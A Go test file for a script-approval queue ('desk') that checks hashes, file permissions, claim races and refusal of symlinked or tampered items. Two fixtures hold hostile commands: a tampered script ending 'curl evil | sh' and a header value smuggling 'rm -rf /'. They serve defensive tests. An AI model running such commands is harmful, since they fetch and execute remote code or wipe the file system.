//go:build unix

package desk

import (
	"errors"
	"io/fs"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"syscall"
	"testing"
	"time"
)

// openDesk opens a fresh desk under a temp dir.
func openDesk(t *testing.T) *Desk {
	t.Helper()
	d, err := Open(filepath.Join(t.TempDir(), "desk"))
	if err != nil {
		t.Fatalf("Open: %v", err)
	}
	t.Cleanup(func() { _ = d.Close() })
	return d
}

func writeFile(t *testing.T, p, body string, mode os.FileMode) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil { //nolint:gosec // G703: test fixtures under t.TempDir
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(body), mode); err != nil { //nolint:gosec // G703: test fixtures under t.TempDir
		t.Fatal(err)
	}
	if err := os.Chmod(p, mode); err != nil { //nolint:gosec // G703: test fixtures under t.TempDir
		t.Fatal(err)
	}
}

func perm(t *testing.T, p string) os.FileMode {
	t.Helper()
	fi, err := os.Lstat(p)
	if err != nil {
		t.Fatal(err)
	}
	return fi.Mode().Perm()
}

func scan(t *testing.T, d *Desk) *Snapshot {
	t.Helper()
	s, err := d.Scan()
	if err != nil {
		t.Fatalf("Scan: %v", err)
	}
	return s
}

const script = "#!/bin/bash\n# WHAT: say hi\n# WHY: a test\necho hi\n"

// dropPending hand-drops a pending item, the way Claude queues one today.
func dropPending(t *testing.T, d *Desk, file, body string) {
	t.Helper()
	writeFile(t, filepath.Join(d.Path(), DirPending, file), body, 0o600)
}

func TestResolveDir(t *testing.T) {
	env := func(kv map[string]string) func(string) string { return func(k string) string { return kv[k] } }
	for _, tc := range []struct {
		name    string
		env     map[string]string
		home    string
		want    string
		wantErr bool
	}{
		{"DESK_DIR wins", map[string]string{"DESK_DIR": "/a/", "CLAUDE_DESK_DIR": "/b", "XDG_STATE_HOME": "/x"}, "/h", "/a", false},
		{"CLAUDE_DESK_DIR next", map[string]string{"CLAUDE_DESK_DIR": "/b", "XDG_STATE_HOME": "/x"}, "/h", "/b", false},
		{"XDG state", map[string]string{"XDG_STATE_HOME": "/x"}, "/h", "/x/forgectl/desk", false},
		{"relative XDG is ignored", map[string]string{"XDG_STATE_HOME": "rel"}, "/h", "/h/.local/state/forgectl/desk", false},
		{"home fallback", nil, "/h", "/h/.local/state/forgectl/desk", false},
		{"relative DESK_DIR refused", map[string]string{"DESK_DIR": "rel"}, "/h", "", true},
		{"no home", nil, "", "", true},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got, err := ResolveDir(env(tc.env), tc.home)
			if (err != nil) != tc.wantErr || got != tc.want {
				t.Errorf("ResolveDir = %q, %v; want %q, err %v", got, err, tc.want, tc.wantErr)
			}
		})
	}
}

// A legacy desk is 0755 with 0644 files, loose scripts and extra dirs at its
// root. Open tightens the four protocol dirs and their files and touches
// nothing else.
func TestOpenTightensALegacyDeskAndLeavesUnknownEntriesAlone(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "desk")
	if err := os.Mkdir(dir, 0o755); err != nil { //nolint:gosec // G301,G302: the legacy 0755 desk under test
		t.Fatal(err)
	}
	if err := os.Chmod(dir, 0o755); err != nil { //nolint:gosec // G301,G302: the legacy 0755 desk under test
		t.Fatal(err)
	}
	for _, sub := range []string{DirPending, DirRunning, DirDone, DirSkipped, "hold", "withdrawn"} {
		if err := os.Mkdir(filepath.Join(dir, sub), 0o755); err != nil { //nolint:gosec // G301,G302: the legacy 0755 desk under test
			t.Fatal(err)
		}
		if err := os.Chmod(filepath.Join(dir, sub), 0o755); err != nil { //nolint:gosec // G301,G302: the legacy 0755 desk under test
			t.Fatal(err)
		}
	}
	writeFile(t, filepath.Join(dir, "desk.sh"), "echo root\n", 0o644)
	writeFile(t, filepath.Join(dir, "hold", "x.sh"), "echo hold\n", 0o644)
	writeFile(t, filepath.Join(dir, DirDone, "01-old.log"), "out\nEXIT=0\n", 0o644)
	writeFile(t, filepath.Join(dir, DirDone, "01-old.sh"), script, 0o755)
	beforeRoot := readFileOr(filepath.Join(dir, "desk.sh"))

	d, err := Open(dir)
	if err != nil {
		t.Fatalf("Open: %v", err)
	}
	defer d.Close() //nolint:errcheck // test

	want := map[string]os.FileMode{
		dir:                                       0o700,
		filepath.Join(dir, DirPending):            0o700,
		filepath.Join(dir, DirRunning):            0o700,
		filepath.Join(dir, DirDone):               0o700,
		filepath.Join(dir, DirSkipped):            0o700,
		filepath.Join(dir, DirDone, "01-old.log"): 0o600,
		filepath.Join(dir, DirDone, "01-old.sh"):  0o600,
		// untouched
		filepath.Join(dir, "desk.sh"):      0o644,
		filepath.Join(dir, "hold"):         0o755,
		filepath.Join(dir, "hold", "x.sh"): 0o644,
		filepath.Join(dir, "withdrawn"):    0o755,
	}
	for p, m := range want {
		if got := perm(t, p); got != m {
			t.Errorf("%s: mode %o, want %o", strings.TrimPrefix(p, dir), got, m)
		}
	}
	if after := readFileOr(filepath.Join(dir, "desk.sh")); after != beforeRoot {
		t.Error("a root file's content changed")
	}
	// A scan sees the legacy history and ignores the root's loose scripts.
	s := scan(t, d)
	if len(s.Done) != 1 || s.Done[0].Name != "01-old" || s.Pending != nil {
		t.Errorf("scan = done %v pending %v", s.Done, s.Pending)
	}
}

func TestOpenCreatesAFreshDeskPrivate(t *testing.T) {
	d := openDesk(t)
	for _, sub := range append([]string{""}, protocolDirs[:]...) {
		if got := perm(t, filepath.Join(d.Path(), sub)); got != 0o700 {
			t.Errorf("%s/: mode %o, want 700", sub, got)
		}
	}
}

func TestOpenRefusesAProtocolDirThatIsASymlink(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "desk")
	elsewhere := t.TempDir()
	if err := os.Mkdir(dir, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(elsewhere, filepath.Join(dir, DirPending)); err != nil {
		t.Fatal(err)
	}
	if _, err := Open(dir); err == nil || !strings.Contains(err.Error(), "not a directory") {
		t.Fatalf("Open = %v, want a refusal", err)
	}
}

func TestOpenRefusesARelativePath(t *testing.T) {
	if _, err := Open("desk"); err == nil {
		t.Fatal("want an error")
	}
}

// Legacy history: logs ending in EXIT= and logs without one. Neither is
// hidden; a log with no EXIT line reads as no exit recorded.
func TestScanReadsLegacyHistory(t *testing.T) {
	d := openDesk(t)
	done := filepath.Join(d.Path(), DirDone)
	writeFile(t, filepath.Join(done, "01-pass.log"), "ok\nEXIT=0\n", 0o600)
	writeFile(t, filepath.Join(done, "01-pass.sh"), script, 0o600)
	writeFile(t, filepath.Join(done, "02-fail.log"), "boom\nEXIT=3\n", 0o600)
	writeFile(t, filepath.Join(done, "03-noexit.log"), "killed mid-run\n", 0o600)
	writeFile(t, filepath.Join(done, "04-spoof.log"), "printf without newlineEXIT=0", 0o600)
	writeFile(t, filepath.Join(done, "notes.txt"), "not protocol", 0o600)

	got := map[string]*int{}
	for _, it := range scan(t, d).Done {
		got[it.Name] = it.ExitCode
		if it.Ended.IsZero() {
			t.Errorf("%s: no end time from the legacy fallback", it.Name)
		}
	}
	if len(got) != 4 {
		t.Fatalf("history = %v, want 4 items", got)
	}
	for name, want := range map[string]int{"01-pass": 0, "02-fail": 3} {
		if got[name] == nil || *got[name] != want {
			t.Errorf("%s exit = %v, want %d", name, got[name], want)
		}
	}
	for _, name := range []string{"03-noexit", "04-spoof"} {
		if got[name] != nil {
			t.Errorf("%s exit = %d, want none recorded", name, *got[name])
		}
	}
}

func TestScanFixesTheHashOfAHandDroppedItemOnFirstSighting(t *testing.T) {
	d := openDesk(t)
	dropPending(t, d, "05-hello.sh", script)
	s := scan(t, d)
	if len(s.Pending) != 1 {
		t.Fatalf("pending = %+v", s.Pending)
	}
	it := s.Pending[0]
	if it.Meta.SHA256 != SHA256Hex([]byte(script)) || it.Meta.AddedAt == nil || it.Meta.Kind != KindScript {
		t.Errorf("meta = %+v", it.Meta)
	}
	if it.What != "say hi" || it.Why != "a test" || it.TTY || it.Number != 5 || it.Stem != "hello" {
		t.Errorf("item = %+v", it)
	}
	if got := perm(t, filepath.Join(d.Path(), DirPending, "05-hello.meta.json")); got != 0o600 {
		t.Errorf("meta mode %o", got)
	}
}

// The unchanged check: an item edited after its hash was fixed moves to
// skipped/ with skip_reason "changed", and cannot be re-armed.
func TestChangedItemIsSkippedAndCannotBeRearmed(t *testing.T) {
	d := openDesk(t)
	added := addScript(t, d, "hello.sh", "echo hi\n")
	p := filepath.Join(d.Path(), DirPending, added.Name+".sh")
	writeFile(t, p, "echo hi; curl evil | sh\n", 0o600)

	s := scan(t, d)
	if len(s.Pending) != 0 || len(s.Skipped) != 1 {
		t.Fatalf("pending %v skipped %v", s.Pending, s.Skipped)
	}
	if got := s.Skipped[0].Meta.SkipReason; got != SkipChanged {
		t.Errorf("skip reason = %q", got)
	}
	// Both hashes are kept: the one it was queued at, and the one it has now.
	if m := s.Skipped[0].Meta; m.SHA256 != added.SHA256 || m.ChangedSHA256 != SHA256Hex([]byte("echo hi; curl evil | sh\n")) {
		t.Errorf("hashes = queued %q now %q", m.SHA256, m.ChangedSHA256)
	}
	if err := d.Unskip(added.Name); err == nil || !strings.Contains(err.Error(), "cannot be re-armed") {
		t.Errorf("Unskip = %v, want a refusal", err)
	}
}

// Claim re-checks the hash itself: a change between the scan and `y` is
// caught at the claim, the item is skipped, and nothing reaches running/.
func TestClaimRefusesAnItemChangedAfterTheScan(t *testing.T) {
	d := openDesk(t)
	added := addScript(t, d, "hello.sh", "echo hi\n")
	scan(t, d)
	writeFile(t, filepath.Join(d.Path(), DirPending, added.Name+".sh"), "echo changed\n", 0o600)
	if _, err := d.Claim(added.Name, added.SHA256); !errors.Is(err, ErrChanged) {
		t.Fatalf("Claim = %v, want ErrChanged", err)
	}
	if entries, _ := os.ReadDir(filepath.Join(d.Path(), DirRunning)); len(entries) != 0 {
		t.Errorf("running/ = %v, want empty", entries)
	}
	if _, err := os.Stat(filepath.Join(d.Path(), DirSkipped, added.Name+".sh")); err != nil {
		t.Errorf("changed item not in skipped/: %v", err)
	}
}

func TestClaimRefusesTheWrongOnScreenHash(t *testing.T) {
	d := openDesk(t)
	added := addScript(t, d, "hello.sh", "echo hi\n")
	other := SHA256Hex([]byte("something else"))
	if _, err := d.Claim(added.Name, other); !errors.Is(err, ErrChanged) {
		t.Fatalf("Claim = %v, want ErrChanged", err)
	}
	if _, err := os.Stat(filepath.Join(d.Path(), DirPending, added.Name+".sh")); err != nil {
		t.Error("a hash mismatch on the caller's side moved the item")
	}
}

func TestClaimWritesTheVerifiedBytesToAFreshFile(t *testing.T) {
	d := openDesk(t)
	added := addScript(t, d, "hello.sh", "echo hi\n")
	pend := filepath.Join(d.Path(), DirPending, added.Name+".sh")
	before, err := os.Stat(pend)
	if err != nil {
		t.Fatal(err)
	}
	c, err := d.Claim(added.Name, added.SHA256)
	if err != nil {
		t.Fatalf("Claim: %v", err)
	}
	after, err := os.Stat(c.RecordPath)
	if err != nil {
		t.Fatal(err)
	}
	if os.SameFile(before, after) {
		t.Error("running/ holds the queued inode, not a fresh copy")
	}
	data, _ := os.ReadFile(c.RecordPath)
	if SHA256Hex(data) != added.SHA256 || c.SHA256 != added.SHA256 {
		t.Error("the running copy is not the verified bytes")
	}
	if _, err := os.Stat(filepath.Join(d.Path(), DirRunning, added.Name+".meta.json")); err != nil {
		t.Error("meta did not move with the item")
	}
}

// Two desks on one dir: the rename decides; the loser gets ErrClaimed and
// changes nothing.
func TestSecondClaimLoses(t *testing.T) {
	d := openDesk(t)
	added := addScript(t, d, "hello.sh", "echo hi\n")
	other, err := Open(d.Path())
	if err != nil {
		t.Fatal(err)
	}
	defer other.Close() //nolint:errcheck // test
	if _, err := d.Claim(added.Name, added.SHA256); err != nil {
		t.Fatalf("first Claim: %v", err)
	}
	if _, err := other.Claim(added.Name, added.SHA256); !errors.Is(err, ErrClaimed) {
		t.Fatalf("second Claim = %v, want ErrClaimed", err)
	}
}

// Refusals: a symlink, a hard link, and a FIFO are never read or run. They
// stay where they are, shown as refused.
func TestScanAndClaimRefuseAnythingButAOneLinkRegularFile(t *testing.T) {
	for _, tc := range []struct {
		name   string
		plant  func(t *testing.T, d *Desk, p string)
		reason string
	}{
		{"symlink", func(t *testing.T, d *Desk, p string) {
			target := filepath.Join(t.TempDir(), "elsewhere.sh")
			writeFile(t, target, script, 0o600)
			if err := os.Symlink(target, p); err != nil {
				t.Fatal(err)
			}
		}, "a symlink"},
		{"hard link", func(t *testing.T, d *Desk, p string) {
			other := filepath.Join(d.Path(), "outside-protocol.sh")
			writeFile(t, other, script, 0o600)
			if err := os.Link(other, p); err != nil {
				t.Fatal(err)
			}
		}, "a hard link (link count 2)"},
		{"fifo", func(t *testing.T, d *Desk, p string) {
			if err := syscall.Mkfifo(p, 0o600); err != nil {
				t.Fatal(err)
			}
		}, "not a regular file"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			d := openDesk(t)
			p := filepath.Join(d.Path(), DirPending, "07-planted.sh")
			tc.plant(t, d, p)
			s := scan(t, d)
			if len(s.Pending) != 1 || s.Pending[0].State != StateRefused || s.Pending[0].Refusal != tc.reason {
				t.Fatalf("pending = %+v, want refused (%s)", s.Pending, tc.reason)
			}
			if s.Pending[0].Content != nil || s.Pending[0].Meta.SHA256 != "" {
				t.Error("a refused item was read or hashed")
			}
			// Even with a hash recorded, Claim reads through O_NOFOLLOW and
			// refuses before anything runs.
			if err := d.writeMeta(DirPending, "07-planted", Meta{SHA256: SHA256Hex([]byte(script)), Kind: KindScript}); err != nil {
				t.Fatal(err)
			}
			if _, err := d.Claim("07-planted", SHA256Hex([]byte(script))); !errors.Is(err, ErrRefused) {
				t.Fatalf("Claim = %v, want ErrRefused", err)
			}
			if _, err := os.Lstat(filepath.Join(d.Path(), DirRunning, "07-planted.sh")); err == nil {
				t.Error("a refused item was left in running/")
			}
		})
	}
}

func addScript(t *testing.T, d *Desk, file, body string) Added {
	t.Helper()
	src := filepath.Join(t.TempDir(), file)
	writeFile(t, src, body, 0o600)
	a, err := d.Add(src, "what it does", "why it matters", false)
	if err != nil {
		t.Fatalf("Add: %v", err)
	}
	return a
}

func TestAddInsertsHeadersBeforeHashing(t *testing.T) {
	d := openDesk(t)
	src := filepath.Join(t.TempDir(), "deploy.sh")
	writeFile(t, src, "#!/bin/bash\nset -e\necho go\n", 0o600)
	a, err := d.Add(src, "deploy it", "Cameron asked", true)
	if err != nil {
		t.Fatalf("Add: %v", err)
	}
	if a.Name != "01-deploy" || a.Kind != KindScript {
		t.Errorf("added = %+v", a)
	}
	got, err := os.ReadFile(a.Path)
	if err != nil {
		t.Fatal(err)
	}
	want := "#!/bin/bash\n# WHAT: deploy it\n# WHY: Cameron asked\n# TTY: yes\nset -e\necho go\n"
	if string(got) != want {
		t.Errorf("queued = %q, want %q", got, want)
	}
	if a.SHA256 != SHA256Hex([]byte(want)) {
		t.Error("hash is not over the bytes with headers")
	}
	if perm(t, a.Path) != 0o600 {
		t.Errorf("queued mode %o", perm(t, a.Path))
	}
	if fi, _ := os.Lstat(a.Path); fi.Sys().(*syscall.Stat_t).Nlink != 1 {
		t.Error("the queued file kept a second link")
	}
	if entries, _ := os.ReadDir(filepath.Join(d.Path(), DirPending)); len(entries) != 2 {
		t.Errorf("pending/ = %v, want the item and its meta only", entries)
	}
}

func TestAddValidates(t *testing.T) {
	d := openDesk(t)
	dir := t.TempDir()
	for _, tc := range []struct {
		name, file, body, what, why string
		tty                         bool
		needle                      string
	}{
		{"bad extension", "x.py", "print(1)", "w", "y", false, ".sh"},
		{"bad stem", "../x.sh", "true", "w", "y", false, ""},
		{"missing why", "x.sh", "true", "w", "", false, "WHAT and WHY"},
		{"multi-line what", "x.sh", "true", "w\nrm -rf /", "y", false, "one line"},
		{"header twice", "x.sh", "# WHAT: here\ntrue", "w", "y", false, "already has"},
		{"tty batch", "b.manifest", "a -- true", "w", "y", true, "TTY"},
		{"bad manifest", "b.manifest", "a after=zz -- true", "w", "y", false, "unknown dependency"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			src := filepath.Join(dir, tc.file)
			if !strings.Contains(tc.file, "..") {
				writeFile(t, src, tc.body, 0o600)
			}
			_, err := d.Add(src, tc.what, tc.why, tc.tty)
			if err == nil || !strings.Contains(err.Error(), tc.needle) {
				t.Errorf("Add = %v, want an error containing %q", err, tc.needle)
			}
		})
	}
	if entries, _ := os.ReadDir(filepath.Join(d.Path(), DirPending)); len(entries) != 0 {
		t.Errorf("a refused add left %v in pending/", entries)
	}
}

// Numbering continues past every protocol dir, and skips a name already
// visible anywhere.
func TestAddNumbersPastExistingItems(t *testing.T) {
	d := openDesk(t)
	writeFile(t, filepath.Join(d.Path(), DirDone, "03-old.log"), "EXIT=0\n", 0o600)
	if first := addScript(t, d, "job.sh", "echo one\n"); first.Name != "04-job" {
		t.Fatalf("first = %s, want 04-job", first.Name)
	}
	if second := addScript(t, d, "job.sh", "echo two\n"); second.Name != "05-job" {
		t.Errorf("second = %s, want 05-job", second.Name)
	}
}

// The exclusive create: a hand-dropped file that appears after the name
// check, at the very name Add is about to take, is never overwritten; the
// link fails with EEXIST and Add moves to the next number.
func TestAddNeverOverwritesAFileThatAppearsAtItsName(t *testing.T) {
	d := openDesk(t)
	hand := filepath.Join(d.Path(), DirPending, "01-job.sh")
	planted := false
	beforeLink = func(file string) {
		if !planted && file == "01-job.sh" {
			planted = true
			writeFile(t, hand, "# hand-dropped\n", 0o600)
		}
	}
	t.Cleanup(func() { beforeLink = func(string) {} })

	a := addScript(t, d, "job.sh", "echo one\n")
	if !planted {
		t.Fatal("the race hook never ran; the test did not reach the link")
	}
	if a.Name != "02-job" {
		t.Errorf("added = %s, want 02-job after the collision", a.Name)
	}
	if got := readFileOr(hand); got != "# hand-dropped\n" {
		t.Error("Add overwrote the hand-dropped file")
	}
	if _, err := os.Lstat(filepath.Join(d.Path(), DirPending, "01-job.meta.json")); !errors.Is(err, fs.ErrNotExist) {
		t.Error("Add wrote meta for the name it lost")
	}
}

func TestSkipAndUnskip(t *testing.T) {
	d := openDesk(t)
	a := addScript(t, d, "job.sh", "echo one\n")
	if err := d.Skip(a.Name, SkipOperator); err != nil {
		t.Fatalf("Skip: %v", err)
	}
	s := scan(t, d)
	if len(s.Skipped) != 1 || s.Skipped[0].Meta.SkipReason != SkipOperator {
		t.Fatalf("skipped = %+v", s.Skipped)
	}
	if err := d.Unskip(a.Name); err != nil {
		t.Fatalf("Unskip: %v", err)
	}
	s = scan(t, d)
	if len(s.Pending) != 1 || s.Pending[0].Meta.SHA256 != a.SHA256 || s.Pending[0].Meta.SkipReason != "" {
		t.Errorf("pending after undo = %+v", s.Pending)
	}
}

func TestScanFlagsStaleItems(t *testing.T) {
	d := openDesk(t)
	addScript(t, d, "job.sh", "echo one\n")
	d.now = func() time.Time { return time.Now().Add(StaleAfter + time.Minute) }
	if s := scan(t, d); len(s.Pending) != 1 || !s.Pending[0].Stale {
		t.Errorf("pending = %+v, want stale", s.Pending)
	}
}

func TestParseHeaders(t *testing.T) {
	for _, tc := range []struct {
		in   string
		want Headers
	}{
		{"# WHAT: a\n# WHY:   b\n# TTY: yes\n", Headers{What: "a", Why: "b", TTY: true}},
		{"# WHAT: first\n# WHAT: second\n", Headers{What: "first"}},
		{"#WHAT: no space\n  # WHY: indented\n", Headers{}},
		{"# TTY: no\r\n# WHAT: crlf\r\n", Headers{What: "crlf"}},
	} {
		if got := ParseHeaders([]byte(tc.in)); !reflect.DeepEqual(got, tc.want) {
			t.Errorf("ParseHeaders(%q) = %+v, want %+v", tc.in, got, tc.want)
		}
	}
}

// Prune removes old protocol entries in done/ and skipped/ only.
func TestPruneRemovesOnlyOldProtocolEntries(t *testing.T) {
	d := openDesk(t)
	root := d.Path()
	old := time.Now().Add(-40 * 24 * time.Hour)
	plantOld := func(rel string) {
		p := filepath.Join(root, rel)
		if strings.HasSuffix(rel, ".d") {
			if err := os.MkdirAll(filepath.Join(p, "steps"), 0o700); err != nil { //nolint:gosec // G703: test fixtures under t.TempDir
				t.Fatal(err)
			}
		} else {
			writeFile(t, p, "x\n", 0o600)
		}
		if err := os.Chtimes(p, old, old); err != nil {
			t.Fatal(err)
		}
	}
	for _, rel := range []string{
		"done/01-a.sh", "done/01-a.log", "done/01-a.meta.json", "done/01-a.events",
		"done/02-b.manifest", "done/02-b.log", "done/02-b.d",
		"skipped/03-c.sh", "skipped/03-c.meta.json",
		"done/notes.txt", "done/.hidden.log", "pending/04-d.sh", "loose.sh",
		"done/05-live.log", "running/05-live.sh",
	} {
		plantOld(rel)
	}
	writeFile(t, filepath.Join(root, "done/06-new.log"), "EXIT=0\n", 0o600)
	if err := os.Symlink(filepath.Join(root, "loose.sh"), filepath.Join(root, "done/07-link.log")); err != nil {
		t.Fatal(err)
	}

	n, err := d.Prune(30)
	if err != nil {
		t.Fatalf("Prune: %v", err)
	}
	if n != 3 {
		t.Errorf("removed %d items, want 3", n)
	}
	for _, rel := range []string{"done/01-a.sh", "done/01-a.log", "done/01-a.meta.json", "done/01-a.events", "done/02-b.manifest", "done/02-b.log", "done/02-b.d", "skipped/03-c.sh", "skipped/03-c.meta.json"} {
		if _, err := os.Lstat(filepath.Join(root, rel)); err == nil {
			t.Errorf("%s survived", rel)
		}
	}
	for _, rel := range []string{"done/notes.txt", "done/.hidden.log", "pending/04-d.sh", "loose.sh", "done/05-live.log", "running/05-live.sh", "done/06-new.log", "done/07-link.log"} {
		if _, err := os.Lstat(filepath.Join(root, rel)); err != nil {
			t.Errorf("%s was removed", rel)
		}
	}
	if _, err := d.Prune(0); err == nil {
		t.Error("Prune(0) should refuse")
	}
}

// One item with a mode its owner cannot read must not stop the desk: Open
// succeeds, and the item is refused rather than run.
func TestAnUnreadableItemIsRefusedAndDoesNotBlockOpen(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("root reads a mode-000 file")
	}
	dir := filepath.Join(t.TempDir(), "desk")
	d, err := Open(dir)
	if err != nil {
		t.Fatal(err)
	}
	_ = d.Close()
	locked := filepath.Join(dir, DirPending, "03-locked.sh")
	writeFile(t, locked, script, 0o000)
	t.Cleanup(func() { _ = os.Chmod(locked, 0o600) })

	d, err = Open(dir)
	if err != nil {
		t.Fatalf("Open with a mode-000 item: %v", err)
	}
	defer d.Close() //nolint:errcheck // test
	if got := perm(t, locked); got != 0o000 {
		t.Errorf("mode %o; an unreadable file is left as it is", got)
	}
	s := scan(t, d)
	if len(s.Pending) != 1 || s.Pending[0].State != StateRefused || s.Pending[0].Refusal != "not readable" {
		t.Fatalf("pending = %+v, want refused (not readable)", s.Pending)
	}
	if _, err := d.Claim("03-locked", anySHA); !errors.Is(err, ErrRefused) {
		t.Errorf("Claim = %v, want ErrRefused", err)
	}
}

func TestOpenNamesTheModeAnUnreadableProtocolDirNeeds(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("root reads a mode-000 directory")
	}
	dir := filepath.Join(t.TempDir(), "desk")
	d, err := Open(dir)
	if err != nil {
		t.Fatal(err)
	}
	_ = d.Close()
	done := filepath.Join(dir, DirDone)
	if err := os.Chmod(done, 0o000); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chmod(done, 0o700) }) //nolint:gosec // G302: restores the protocol dir mode so TempDir cleanup can remove it
	if _, err := Open(dir); err == nil || !strings.Contains(err.Error(), "mode 0700") {
		t.Fatalf("Open = %v, want an error naming mode 0700", err)
	}
}
